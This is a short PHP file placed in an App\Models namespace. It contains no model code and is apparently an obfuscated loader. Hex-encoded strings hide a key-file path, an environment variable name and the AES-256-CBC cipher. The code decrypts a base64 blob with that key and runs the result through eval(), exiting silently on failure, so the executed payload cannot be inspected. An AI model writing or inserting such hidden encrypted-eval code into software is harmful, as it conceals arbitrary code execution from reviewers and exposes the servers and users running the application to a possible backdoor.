<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('kh019LrpMdLxBkBRbyWOyg==');

$c=base64_decode(

'PVSRNGWo01xGo6N6WsDQUvKAiYE6LtM82V7SXuv5B+4BR7PjRgSwwjXenRUf0AlncfYj0T7ukZ/z' .
'yg9qIlvRbyKQ1cBzWpQIFLko8mmYJWBf4t4q7WJGsKLz+vwNt/JqZuqu5bGeSOEHxWJRZ/xa4CYy' .
'OItk0EW+ZC5gTajPi41eND0zoIdchrX7j33DQtU9+G6n7xwzYNr5i9RondgnmKnk+UT82xz0sE3T' .
'eZ2QwFl3dJcVac9OaR7cmVLvp+5R5SBnBG9PiWDRInD3GDO6R0ikOGFZStMg+uhepM0CbcxKiUdP' .
'yIr1ShUfZLfUI7ZToPOUeyppDke81gpVMUrtJqMxDqqO7/zZNoN+s8g9ZKbOJqeY1fKvIDF4/CP+' .
'QwnVMFjZ7/zvEoxIMlBNGwU2OZOod53iYh1kHnPXaLWsptecgWa8uaq8gXp+iYQx+nRUPd577V/F' .
'i0kNVRsf8PrTmWRbZ5E34YGubxkRh8vqtDCsDiT98d+BBAAy0NNQkFH1DZGH1UdJh7SGVJj9SI4i' .
'snBuJ+ZSlbg0TAttsv8qPU/XcdFpUMSjuFz3uLIkEzneODm5jyJHL0TS/vwchfur3SM2uoV6Zg+4' .
'rZ4B6ahvDgHcvLuDm+YB817YHDIesEKkcwQA55wMnt4gnC55z30iaQvI4nBbGjdlqqdDq+6QC8lZ' .
'oqwkk6JAL5+njU4ySjvedcv1bafiUY3t33yXUfJ65WIblk7piT0LHDYc1AUibRtv+vYs9f8eDnFi' .
'wZkxSh3xXPYjDAHM8gLvOJanwYzdwNgWUPWB+52FEZh1srnRrAsToCjAax8UNxSWD6YALaBgY4I6' .
'zi6IAZD8coZl0Os3kvSTVCwFacZkVNFf5jKMlA3dPCyc4+xEVWam4wnuPUITpEBwvNRpViQahDTB' .
'AsUhVag8SOBiABKGA96O3QrFzzhxT1waQxbUvdG5ZTtu3Z7f1/almCYnW5fznheOgVK+rg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

